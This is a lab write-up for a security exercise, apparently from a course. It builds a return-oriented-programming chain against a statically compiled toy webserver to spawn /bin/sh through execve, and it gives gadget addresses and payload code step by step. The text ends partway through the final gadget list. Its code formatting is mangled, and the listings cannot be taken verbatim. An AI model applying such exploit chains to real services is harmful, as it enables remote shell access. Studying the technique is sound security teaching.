# # execve () ROP

- compilation with `-static` flag;
- stack-protectors disabled;
- ASLR enabled.

Starting from the previous labs, the following ROP Chain has been created which allows you to run the `execve (" / bin / sh ", 0, 0)` systemcall.

The ROP Chain was built using only gadgets present in the binary in order to evade the ASLR (the program was compiled with the `-static` flag to increase the quantity of gadgets present, being of a smaller size).

To identify the gadgets used it is possible to use `objdump` or` RopGadget` (https://github.com/JonathanSalwan/ROPgadget), also available in GDB peda.

The `gadgets` file shows the complete list of the gadgets present.

NOTE: by default, the pre-compiled `tiny-lab3-precomp` version of the webserver is included in order to keep the same addresses in the writeup as a reference. Alternatively, you can uncomment the `# RUN make` line to recompile the server.

## ROP Chain development

### Target

Run syscall `execve (" / bin / sh ", 0, 0)` - whose number is `0xb` - to run shell.

It is therefore necessary:
- `eax = 0xb`:` eax` containing syscall number to be made once made
  interrupt `int 0x80`;
- `ebx`: will have to point to the start memory address of the string" / bin / sh ";
- `ecx`: used to point to argument arrays; not used in this case, so its
  value will be `0x0`;
- `edx`: used to put to environment veritable arrays; not used in this case,
  so it will be `0x0`.
- find and use gadgets with `int 0x80` to make system call.

### Description of gadgets used

#### Writing "/ bin / sh" into memory

First the string "/ bin / sh" was written in memory, in order to reuse it later (EBX will have to point to the beginning of the string).

The gadgets and values ​​used in this regard:

`` `
pop_edx = 0x0807662a # pop edx; ret
pop_eax = 0x080bc865 # pop eax; ret
mov_mem = 0x080562ab # mov dword ptr [edx], eax; ret


write_1 = 0x080f1010 # .bss start address
write_2 = 0x080f1014 # .bss start address + 4
`` `

`write_1` is the chosen memory address where to start writing" / bin / sh "; was chosen
the beginning of the `.bss` section as writable and to avoid overwriting
the `.text` section.

In `write_1` the first 4 bytes" / bin "will be written, while in` write_2` the second part
"// sh" ("// sh" was written to avoid null bytes; at bash level the first "/" will be ignored).

Writing chain "/ bin / sh":
`` `
payload + = p (pop_edx) # EDX will point to .bss start
payload + = p (write_1)
payload + = p (pop_eax) # writes "/ bin" in EAX
payload + = "/ bin"
payload + = p (mov_mem) # moves EAX = "/ bin" at address pointed by EDX (.bss start)
payload + = p (pop_edx)
payload + = p (write_2) # EDX will point at .bss start + 4
payload + = p (pop_eax) # writes "// sh" in EAX
payload + = "// sh"
payload + = p (mov_mem) # moves EAX = "// sh" at address pointed by EDX (.bss start + 4)
`` `

First, `pop_edx` was used to insert` write_1` in `edx` (` pop edx`).

The chain continues by jumping to the `pop_eax` gadget (thanks to the` ret` which inserts the address of the next gadget
on the PC) through which the string "/ bin" is written in the `eax` register.

The third element of the chain is `mov_mem`, which allows you to write the content of` eax` in the address pointed to by `edx`, or` write_1`. In this way the first
part of "/ bin / sh" will be written in the selected memory section.

The chain continues in a similar way to write "// sh", using the same gadgets.

At the end of the chain "/ bin / sh" will be written to the memory address `write_1`.

#### EDX = 0 and EBX -> "/ bin // sh"

`` `
xor_eax = 0x0804a3c3 # xor eax, eax; ret
xor_edx = 0x08098280 # xor edx, edx; div esi; pop ebx; pop esi; pop edi; pop ebp; ret

`` `

Chain used:
`` `
payload + = p (xor_eax) # EAX = 0
payload + = p (xor_edx) # EDX = 0; EBX = address of "/ bin // sh"
payload + = p (write_1)
payload + = "JUNK" * 3
`` `

the `xor_edx` gadget was used to reset the` edx` registry. However, the presence
of the `div esi` instruction makes it necessary to clear the` eax` register first as the instruction
performs the division between `eax` and` esi`, putting the result in `eax` and the rest of the division
in `edx`.

So, by setting `eax = 0x0` first, the result of the division will be 0 with remainder 0 and
and both the `eax` and` edx` registers will contain `0x0`.

Furthermore, in the `xor_edx` gadget there is the` pop ebx` instruction, which will be used to insert
the `write_1` address (which contains" / bin // sh ") in the` ebx` register.

#### ECX = 0

`` `
mov_ecx = 0x0805e319 # mov ecx, edx; rep stosb byte ptr es: [edi], al; mov eax, dword ptr [esp + 8]; pop edi; ret

`` `

Chain used:
`` `
payload + = p (mov_ecx) # ECX = 0
payload + = "JUNK"
`` `

the `mov_ecx` gadget was used to copy the contents of` edx` to `ecx`, that is` 0x0`.

#### EAX = 0xb

`` `
pop_edx = 0x0807662a # pop edx; ret
pop_eax = 0x080bc865 # pop eax; ret
sub_eax = 0x080562dc # sub eax, edx;
